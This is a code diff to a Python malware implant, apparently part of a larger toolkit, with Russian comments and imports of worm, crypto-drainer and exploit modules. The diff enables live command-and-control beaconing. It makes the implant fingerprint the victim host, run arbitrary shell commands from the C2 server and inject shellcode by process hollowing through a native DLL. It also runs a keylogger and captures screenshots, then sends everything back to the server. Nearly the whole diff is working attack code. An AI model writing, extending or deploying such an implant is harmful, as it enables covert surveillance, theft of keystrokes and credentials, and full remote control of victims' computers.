@@ -18,16 +18,17 @@ import requests
 import uuid
 import queue
 import subprocess
+import ctypes
 from typing import Dict, List, Any, Optional, Tuple, Set, Union
 
 # Импортируем основные модули
-from worm.worm_core import WormCore
-from worm.propagation import PropagationEngine
-from modules.web3_drainer import Web3Drainer, MEVDrainer
-from vulnerability_scanner import VulnerabilityScanner
-from exploit_engine import ExploitEngine
-from exploit_manager import ExploitManager
-from steganography import Steganography
+from src.worm.worm_core import WormCore
+from src.worm.propagation import PropagationEngine
+from src.modules.web3_drainer import Web3Drainer, MEVDrainer
+from src.vulnerability_scanner import VulnerabilityScanner
+from src.exploit_engine import ExploitEngine
+from src.exploit_manager import ExploitManager
+from src.steganography import Steganography
 from src.modules.icmp_tunnel import ICMPTunnel
 # from worm import WormholePropagator # Закомментировано - неизвестный модуль
 # from payload import PayloadManager # Комментируем, так как модуля нет
@@ -71,6 +72,9 @@ class AutonomousAgent:
         self.vulnerability_scanner = VulnerabilityScanner()
         self.exploit_manager = ExploitManager()
         self.steganography = Steganography() if self.config.get('stegano_enabled', False) else None
+        
+        # Загрузка нативного модуля инъекции
+        self.injector_lib = self._load_injector_library()
         
         # Очередь задач
         self.task_queue = queue.Queue()
@@ -523,84 +527,491 @@ class AutonomousAgent:
         
         return " ".join(parts)
 
+    def _get_system_info(self) -> Dict[str, Any]:
+        """Собирает детальную информацию о системе."""
+        info = {
+            "agent_uuid": self.agent_uuid,
+            "hostname": "unknown",
+            "internal_ip": "unknown",
+            "external_ip": "unknown",
+            "os": platform.system(),
+            "os_release": platform.release(),
+            "os_version": platform.version(),
+            "architecture": platform.machine(),
+            "python_version": platform.python_version(),
+            "user": "unknown",
+        }
+        try:
+            info["hostname"] = socket.gethostname()
+        except Exception as e:
+            self.logger.warning(f"Could not get hostname: {e}")
+
+        try:
+            # Попытка получить внутренний IP (может быть неточной)
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s.settimeout(0.1) # Не блокировать надолго
+            try:
+                # Не обязательно подключится, но ОС выберет подходящий интерфейс
+                s.connect(('10.255.255.255', 1))
+                info["internal_ip"] = s.getsockname()[0]
+            except Exception:
+                 # Пробуем старый метод, если первый не сработал
+                 try:
+                     info["internal_ip"] = socket.gethostbyname(info["hostname"])
+                 except socket.gaierror:
+                      self.logger.warning("Could not resolve internal IP via hostname.")
+            finally:
+                s.close()
+        except Exception as e:
+            self.logger.warning(f"Could not get internal IP: {e}")
+
+        try:
+            # Попытка получить внешний IP
+            response = requests.get('https://api.ipify.org?format=json', timeout=5)
+            response.raise_for_status() # Проверка на HTTP ошибки
+            info["external_ip"] = response.json().get("ip", "unknown")
+        except requests.RequestException as e:
+            self.logger.warning(f"Could not get external IP: {e}")
+        except Exception as e:
+            self.logger.error(f"Unexpected error getting external IP: {e}")
+
+
+        try:
+            # os.getlogin() может вызвать ошибку, если нет контролирующего терминала
+            info["user"] = os.getlogin()
+        except OSError:
+             try:
+                 # Альтернативный метод для *nix
+                 import pwd
+                 info["user"] = pwd.getpwuid(os.getuid()).pw_name
+             except (ImportError, KeyError):
+                 # Альтернативный метод для Windows
+                 info["user"] = os.environ.get("USERNAME", "unknown")
+        except Exception as e:
+            self.logger.warning(f"Could not get username: {e}")
+
+        return info
+
     def _register_with_c2(self):
-        """Регистрирует агента на C2 сервере"""
-        logger.info(f"Registering agent {self.agent_id} with C2...")
-        # payload = {
-        #     "agent_id": self.agent_id,
-        #     "hostname": socket.gethostname(),
-        #     "os": platform.system(),
-        #     "ip_address": self._get_ip_address(),
-        #     "timestamp": time.time()
-        # }
-        # try:
-        #     response = self.c2_comm.register(payload)
-        #     logger.info(f"Agent registered with C2: {response}")
-        #     return True
-        # except Exception as e:
-        #     logger.error(f"Failed to register with C2: {e}")
-        #     return False
-        logger.warning("C2 communication disabled, skipping registration.")
-        return False # Заглушка
+        """Регистрирует агента на C2 сервере."""
+        c2_url_base = os.environ.get("C2_URL", f"http://{self.config['c2_servers'][0]}") # Используем переменную окружения
+        register_url = f"{c2_url_base}/agents/register"
+        system_info = self._get_system_info() # Получаем информацию о системе
+
+        payload = {
+            "agent_uuid": self.agent_uuid,
+            "system_info": system_info, # Включаем информацию о системе
+            "registered_at": time.time()
+        }
+        try:
+            response = requests.post(register_url, json=payload, timeout=10)
+            response.raise_for_status()
+            result = response.json()
+            self.agent_id = result.get("agent_id") # C2 должен вернуть ID
+            self.logger.info(f"Successfully registered with C2. Agent ID: {self.agent_id}")
+        except requests.RequestException as e:
+            self.logger.error(f"Failed to register with C2 server {register_url}: {e}")
+        except Exception as e:
+            self.logger.error(f"Unexpected error during registration: {e}")
+
 
     def _checkin_loop(self):
-        """Периодически отправляет check-in на C2 и получает задачи"""
+        """Периодически отправляет check-in на C2 сервер и получает задачи."""
+        if not self.agent_id:
+            self.logger.warning("Cannot start check-in loop: Agent not registered.")
+            # Попытка повторной регистрации через некоторое время
+            time.sleep(self.config.get("checkin_interval", 60))
+            self._register_with_c2()
+            if not self.agent_id: return # Выход, если регистрация снова не удалась
+
+        c2_url_base = os.environ.get("C2_URL", f"http://{self.config['c2_servers'][0]}")
+        checkin_url = f"{c2_url_base}/agents/{self.agent_id}/checkin"
+
         while self.running:
-            jitter_sleep(self.config.get("checkin_interval", 60), self.config.get("checkin_jitter", 0.2))
-            logger.debug("Sending check-in to C2...")
-            # try:
-            #     tasks = self.c2_comm.checkin(self.agent_id)
-            #     if tasks:
-            #         logger.info(f"Received {len(tasks)} tasks from C2.")
-            #         for task in tasks:
-            #             self.task_queue.put(task)
-            # except Exception as e:
-            #     logger.error(f"Check-in failed: {e}")
-            logger.warning("C2 communication disabled, skipping check-in.")
+            interval = self.config.get("checkin_interval", 60)
+            jitter = self.config.get("checkin_jitter", 0.2)
+            sleep_time = interval + random.uniform(-interval * jitter, interval * jitter)
+
+            try:
+                # Отправляем check-in
+                payload = {
+                    "timestamp": time.time(),
+                    "status": "active", # Можно добавить больше статусной информации
+                     # TODO: Добавить краткую статистику, нагрузку и т.д.
+                }
+                response = requests.post(checkin_url, json=payload, timeout=10)
+                response.raise_for_status()
+                tasks = response.json().get("tasks", []) # Получаем задачи от C2
+
+                if tasks:
+                    self.logger.info(f"Received {len(tasks)} new tasks from C2.")
+                    for task in tasks:
+                        self.task_queue.put(task) # Помещаем задачи в очередь
+
+            except requests.RequestException as e:
+                self.logger.error(f"Failed to check-in with C2 server {checkin_url}: {e}")
+            except Exception as e:
+                 self.logger.error(f"Unexpected error during check-in: {e}")
+
+            time.sleep(sleep_time)
 
     def _task_worker_loop(self):
-        """Обрабатывает задачи из очереди"""
+        """Обрабатывает задачи из очереди."""
+        self.logger.info("Task worker loop started.")
         while self.running:
             try:
-                task = self.task_queue.get(timeout=1)
-                logger.info(f"Processing task {task.get('task_id')} - {task.get('command')}")
-                result = None
-                error = None
-                try:
-                    result = self._handle_task(task)
-                    logger.info(f"Task {task.get('task_id')} completed successfully.")
-                except Exception as e:
-                    logger.error(f"Error executing task {task.get('task_id')}: {e}", exc_info=True)
-                    error = str(e)
-                
-                # Отправляем результат обратно на C2
-                # self._send_task_result(task.get('task_id'), result, error)
-                logger.warning("C2 communication disabled, skipping result sending.")
-                
-                self.task_queue.task_done()
+                task = self.task_queue.get(timeout=1) # Ожидаем задачу 1 секунду
+                if task:
+                    task_id = task.get("task_id")
+                    self.logger.info(f"Processing task {task_id}: {task.get('command')}")
+                    result = None
+                    error_msg = None
+                    try:
+                        result, error_msg = self._handle_task(task)
+                        self.logger.info(f"Task {task_id} completed. Result: {str(result)[:100]}..., Error: {error_msg}")
+                    except Exception as e:
+                        self.logger.error(f"Error executing task {task_id}: {e}", exc_info=True)
+                        error_msg = str(e)
+
+                    # Отправляем результат обратно на C2
+                    self._send_task_result(task_id, result, error_msg)
+
+                    self.task_queue.task_done() # Сообщаем очереди, что задача обработана
             except queue.Empty:
-                continue
+                continue # Нет задач, продолжаем цикл
             except Exception as e:
-                logger.error(f"Error in task worker loop: {e}")
-                time.sleep(5) # Пауза при серьезной ошибке
+                self.logger.error(f"Error in task worker loop: {e}", exc_info=True)
+                # Небольшая пауза перед следующей попыткой, чтобы не загружать CPU в случае постоянных ошибок
+                time.sleep(5)
+        self.logger.info("Task worker loop stopped.")
+
+
+    def _handle_task(self, task: Dict[str, Any]) -> Tuple[Any, Optional[str]]:
+        """
+        Обрабатывает конкретную задачу, полученную от C2.
+        Возвращает кортеж (result, error_message).
+        """
+        command = task.get("command")
+        params = task.get("params", {})
+        task_id = task.get("task_id") # Для логирования
+
+        result: Any = None
+        error_message: Optional[str] = None
+
+        self.logger.debug(f"Handling task {task_id}: command='{command}', params={params}")
+
+        try:
+            if command == "execute_shell":
+                cmd_to_run = params.get("command_line")
+                if not cmd_to_run:
+                    raise ValueError("Missing 'command_line' parameter for execute_shell")
+                # Используем subprocess для выполнения команды
+                # Важно: Обработка вывода и ошибок, таймауты
+                process = subprocess.run(
+                    cmd_to_run,
+                    shell=True,       # Осторожно! Позволяет выполнять сложные команды, но есть риски безопасности.
+                    capture_output=True, # Захватываем stdout и stderr
+                    text=True,         # Декодируем вывод в текст
+                    timeout=params.get("timeout", 60) # Таймаут выполнения
+                )
+                if process.returncode == 0:
+                    result = process.stdout
+                else:
+                    error_message = f"Command failed with code {process.returncode}: {process.stderr}"
+                    result = process.stdout # Все равно возвращаем stdout, если он есть
+
+            elif command == "get_system_info":
+                result = self._get_system_info()
+
+            elif command == "sleep":
+                duration = params.get("duration", 60)
+                self.logger.info(f"Sleeping for {duration} seconds...")
+                time.sleep(duration)
+                result = f"Slept for {duration} seconds."
+
+            elif command == "inject_shellcode":
+                target_process = params.get("target_process")
+                shellcode_b64 = params.get("shellcode_b64") # Ожидаем шеллкод в base64
+                
+                if not target_process or not shellcode_b64:
+                     raise ValueError("Missing 'target_process' or 'shellcode_b64' parameter for inject_shellcode")
+                
+                result, error_message = self._handle_inject_shellcode(target_process, shellcode_b64)
+
+            elif command == 'start_keylogger':
+                success = self.injector_lib.StartKeylogger() if self.injector_lib else False
+                return {"status": "success" if success else "failure"}, "Keylogger start failed" if not success else None
+            elif command == 'stop_keylogger':
+                success = self.injector_lib.StopKeylogger() if self.injector_lib else False
+                return {"status": "success" if success else "failure"}, "Keylogger stop failed" if not success else None
+            elif command == 'get_keylogs':
+                if not self.injector_lib:
+                    return None, "Injector library not loaded"
+                logs_ptr = self.injector_lib.GetKeyLogs()
+                if logs_ptr:
+                    # Decode bytes to string (assuming UTF-8 or similar)
+                    logs_str = logs_ptr.decode('utf-8', errors='replace')
+                    # self.injector_lib.FreeKeyLogsBuffer(logs_ptr) # No-op currently
+                    return {"logs": logs_str}, None
+                else:
+                    return {"logs": "[]"}, "Failed to get keylogs or no logs available" # Return empty json array if null ptr
+            elif command == 'screenshot':
+                 return self._handle_screenshot()
+
+            # --- Место для добавления обработчиков других команд ---
+            # elif command == "download_file":
+            #     result, error_message = self._handle_download_file(params)
+            # elif command == "upload_file":
+            #     result, error_message = self._handle_upload_file(params)
+            # elif command == "run_module": # Запуск одного из внутренних модулей агента
+            #     result, error_message = self._handle_run_module(params)
+            # ---------------------------------------------------------
+
+            else:
+                error_message = f"Unknown command: {command}"
+                self.logger.warning(f"Received unknown command '{command}' in task {task_id}")
+
+        except subprocess.TimeoutExpired:
+            error_message = "Command execution timed out."
+            self.logger.error(f"Task {task_id} timed out.")
+        except ValueError as e: # Ловим ошибки параметров
+             error_message = str(e)
+             self.logger.error(f"Parameter error for task {task_id}: {e}")
+        except Exception as e:
+            error_message = f"Error executing command '{command}': {e}"
+            self.logger.error(f"Exception during task {task_id} execution: {e}", exc_info=True)
+
+        return result, error_message
+
+    def _handle_inject_shellcode(self, target_process: str, shellcode_b64: str) -> Tuple[Any, Optional[str]]:
+        """Обрабатывает команду инъекции шеллкода через нативный модуль."""
+        if not self.injector_lib:
+            return None, "Native injector library not loaded."
+            
+        if platform.system() != "Windows":
+            return None, "Shellcode injection via Process Hollowing is only supported on Windows."
+            
+        try:
+            import base64
+            shellcode_bytes = base64.b64decode(shellcode_b64)
+            shellcode_size = len(shellcode_bytes)
+            self.logger.info(f"Decoded shellcode size: {shellcode_size} bytes for injection into {target_process}")
+        except Exception as e:
+            self.logger.error(f"Failed to decode base64 shellcode: {e}")
+            return None, f"Failed to decode base64 shellcode: {e}"
+            
+        if shellcode_size == 0:
+             return None, "Decoded shellcode is empty."
+
+        # Подготовка параметров для ctypes
+        c_target_process = ctypes.c_char_p(target_process.encode('utf-8'))
+        # Создаем изменяемый буфер для шеллкода
+        c_shellcode_buffer = ctypes.create_string_buffer(shellcode_bytes, shellcode_size) 
+        c_shellcode_size = ctypes.c_ulong(shellcode_size)
+        # Указатель для получения сообщения об ошибке из C++
+        c_error_msg_ptr = ctypes.c_char_p() 
+
+        error_message: Optional[str] = None
+        result_message: str = ""
+
+        try:
+            # Вызываем нативную функцию
+            status_code = self.injector_lib.inject_process_hollowing(
+                c_target_process,
+                ctypes.cast(c_shellcode_buffer, ctypes.c_void_p), # Передаем как void*
+                c_shellcode_size,
+                ctypes.byref(c_error_msg_ptr) # Передаем указатель на указатель char*
+            )
+
+            # Проверяем результат и сообщение об ошибке
+            if status_code == 0:
+                result_message = f"Native injection function returned success (code {status_code})."
+                self.logger.info(result_message)
+            else:
+                if c_error_msg_ptr and c_error_msg_ptr.value:
+                     # Копируем сообщение об ошибке из C++ строки
+                    error_message = c_error_msg_ptr.value.decode('utf-8', errors='replace')
+                    self.logger.error(f"Native injection failed. Status: {status_code}, Error: {error_message}")
+                    # Освобождаем память, выделенную в C++
+                    self.injector_lib.free_error_message(c_error_msg_ptr)
+                else:
+                    error_message = f"Native injection function failed with code {status_code}, but no error message provided."
+                    self.logger.error(error_message)
+                result_message = f"Injection failed (code {status_code})."
+
+        except Exception as e:
+            self.logger.error(f"Exception during native injection call: {e}", exc_info=True)
+            error_message = f"Python exception during native call: {e}"
+            result_message = "Injection failed due to Python exception."
+            # На всякий случай пробуем освободить память, если указатель был установлен
+            if c_error_msg_ptr and c_error_msg_ptr.value and hasattr(self.injector_lib, 'free_error_message'):
+                 try:
+                     self.injector_lib.free_error_message(c_error_msg_ptr)
+                 except Exception as free_e:
+                     self.logger.warning(f"Exception while trying to free C++ error message after another exception: {free_e}")
+
+        return result_message, error_message
+
+    def _handle_screenshot(self) -> Tuple[Any, Optional[str]]:
+        """Handles the 'screenshot' command using the native library."""
+        self.logger.info("Handling screenshot command")
+        if not self.injector_lib:
+            self.logger.error("Injector library not loaded, cannot take screenshot.")
+            return None, "Injector library not loaded"
+
+        screenshot_ptr = None
+        try:
+            # Define argument types and return type for CaptureScreenshot just before calling
+            # This ensures ctypes knows how to handle the pointer correctly.
+            self.injector_lib.CaptureScreenshot.restype = ctypes.POINTER(ctypes.c_char)
+            self.injector_lib.CaptureScreenshot.argtypes = []
+
+            screenshot_ptr = self.injector_lib.CaptureScreenshot()
+
+            if screenshot_ptr:
+                # Determine the length of the C string (Base64 data)
+                # We need to iterate until the null terminator.
+                # Alternatively, if the C++ side could return the length, it would be safer.
+                # For now, we assume it's null-terminated.
+                # Create a Python bytes object from the C pointer
+                screenshot_bytes = ctypes.cast(screenshot_ptr, ctypes.c_char_p).value
+                if screenshot_bytes:
+                    # The result is already Base64 encoded by the C++ function
+                    screenshot_b64 = screenshot_bytes.decode('ascii') # Base64 is ASCII safe
+                    self.logger.info(f"Screenshot captured successfully ({len(screenshot_b64)} bytes Base64)")
+                    return {"screenshot_b64": screenshot_b64}, None
+                else:
+                     self.logger.error("CaptureScreenshot returned a pointer, but reading it resulted in empty data.")
+                     return None, "Failed to read screenshot data from pointer"
+            else:
+                self.logger.error("CaptureScreenshot returned a null pointer.")
+                return None, "Native screenshot capture failed (returned null)"
+
+        except Exception as e:
+            self.logger.exception(f"Error during screenshot capture: {e}")
+            return None, f"Exception during screenshot capture: {e}"
+        finally:
+            # CRITICAL: Free the memory allocated by the C++ function
+            if screenshot_ptr and self.injector_lib:
+                 try:
+                    self.injector_lib.FreeScreenshotData.restype = None
+                    self.injector_lib.FreeScreenshotData.argtypes = [ctypes.POINTER(ctypes.c_char)]
+                    self.injector_lib.FreeScreenshotData(screenshot_ptr)
+                    self.logger.debug("Freed screenshot data memory")
+                 except Exception as free_e:
+                    self.logger.error(f"Failed to free screenshot data memory: {free_e}")
+
 
     def _send_task_result(self, task_id: str, result: Any, error: Optional[str]):
-        """Отправляет результат выполнения задачи на C2"""
-        logger.debug(f"Sending result for task {task_id}...")
-        # payload = {
-        #     "agent_id": self.agent_id,
-        #     "task_id": task_id,
-        #     "timestamp": time.time(),
-        #     "result": result,
-        #     "error": error
-        # }
-        # try:
-        #     self.c2_comm.send_result(task_id, payload)
-        #     logger.debug(f"Result for task {task_id} sent.")
-        # except Exception as e:
-        #     logger.error(f"Failed to send result for task {task_id}: {e}")
-        logger.warning("C2 communication disabled, cannot send task result.")
+        """Отправляет результат выполнения задачи на C2 сервер."""
+        if not self.agent_id:
+            self.logger.error("Cannot send task result: Agent not registered.")
+            return
+        if not task_id:
+            self.logger.error("Cannot send task result: Missing task_id.")
+            return
 
+        c2_url_base = os.environ.get("C2_URL", f"http://{self.config['c2_servers'][0]}")
+        result_url = f"{c2_url_base}/agents/{self.agent_id}/results/{task_id}"
+
+        payload = {
+            "task_id": task_id,
+            "completed_at": time.time(),
+            "status": "error" if error else "completed",
+            "output": result,
+            "error_message": error
+        }
+
+        # Сериализация результата, если он не является базовым типом JSON
+        def default_serializer(obj):
+            if isinstance(obj, (bytes, bytearray)):
+                 # Попытка декодировать как UTF-8, с заменой ошибок
+                try:
+                    return obj.decode('utf-8', errors='replace')
+                except Exception:
+                    return repr(obj) # Если не удалось, вернуть строковое представление
+            return repr(obj) # Возвращаем строковое представление для других несериализуемых типов
+
+        try:
+            # Используем json.dumps с default для обработки несериализуемых типов
+            json_payload = json.dumps(payload, default=default_serializer)
+            headers = {'Content-Type': 'application/json'}
+            response = requests.post(result_url, data=json_payload, headers=headers, timeout=15)
+            response.raise_for_status()
+            self.logger.info(f"Successfully sent result for task {task_id} to C2.")
+        except requests.RequestException as e:
+            self.logger.error(f"Failed to send result for task {task_id} to {result_url}: {e}")
+        except TypeError as e:
+            self.logger.error(f"Serialization error sending result for task {task_id}: {e}. Payload: {payload}")
+        except Exception as e:
+            self.logger.error(f"Unexpected error sending task result {task_id}: {e}")
+
+    def _load_injector_library(self):
+        """Загружает нативную библиотеку инъектора (DLL/SO)."""
+        lib_path = None
+        lib_name = "cpp_injector.dll" # Имя файла для Windows
+        # Используем абсолютный путь внутри контейнера
+        dll_path_in_container = "/app/src/native/cpp_injector/build/lib/cpp_injector.dll"
+        
+        # Пытаемся найти DLL по ожидаемому пути в контейнере
+        if os.path.exists(dll_path_in_container):
+            lib_path = dll_path_in_container
+        else:
+             # Если агент запущен не в Docker (например, на Windows для теста) 
+             # или путь в Dockerfile неверен, пытаемся загрузить по имени
+            lib_path = lib_name 
+            self.logger.warning(f"Native library '{lib_name}' not found at expected container path {dll_path_in_container}. Attempting to load by name.")
+
+        try:
+            self.logger.info(f"Attempting to load native library: {lib_path}")
+            # Просто пытаемся загрузить через CDLL. 
+            # На Linux это вызовет ожидаемую ошибку OSError.
+            # На Windows (если код запущен там) это должно сработать.
+            self.injector_lib = ctypes.CDLL(lib_path)
+            
+            # Определяем сигнатуры функций
+            self.injector_lib.inject_process_hollowing.argtypes = [
+                ctypes.c_char_p,         
+                ctypes.c_void_p,         
+                ctypes.c_ulong,          
+                ctypes.POINTER(ctypes.c_char_p) 
+            ]
+            self.injector_lib.inject_process_hollowing.restype = ctypes.c_int 
+            
+            self.injector_lib.free_error_message.argtypes = [ctypes.c_char_p] 
+            self.injector_lib.free_error_message.restype = None
+
+            # Keylogger functions
+            try:
+                self.injector_lib.StartKeylogger.restype = ctypes.c_bool
+                self.injector_lib.StartKeylogger.argtypes = []
+                self.injector_lib.StopKeylogger.restype = ctypes.c_bool
+                self.injector_lib.StopKeylogger.argtypes = []
+                # Returns a pointer to a const char*, need to handle memory (not freed by Python)
+                self.injector_lib.GetKeyLogs.restype = ctypes.c_char_p
+                self.injector_lib.GetKeyLogs.argtypes = []
+                # No-op for now, but good practice to define
+                self.injector_lib.FreeKeyLogsBuffer.restype = None
+                self.injector_lib.FreeKeyLogsBuffer.argtypes = [ctypes.c_char_p]
+
+                # Screenshot functions
+                # Returns char*, which needs to be freed by FreeScreenshotData
+                self.injector_lib.CaptureScreenshot.restype = ctypes.POINTER(ctypes.c_char) # Pointer to char array
+                self.injector_lib.CaptureScreenshot.argtypes = []
+                self.injector_lib.FreeScreenshotData.restype = None
+                self.injector_lib.FreeScreenshotData.argtypes = [ctypes.POINTER(ctypes.c_char)]
+
+            except AttributeError as e:
+                self.logger.error(f"Failed to find expected function in injector library: {e}")
+                # Optionally disable features that rely on the missing functions
+                # For now, we'll let it fail later if called
+
+            self.logger.info(f"Injector library loaded successfully from {lib_path}")
+            return self.injector_lib
+
+        except (OSError, FileNotFoundError) as e:
+            self.logger.error(f"Failed to load injector library: {e}. Native features disabled.")
+            return None
 
 if __name__ == "__main__":
     # Проверяем наличие аргумента с путем к конфигурации
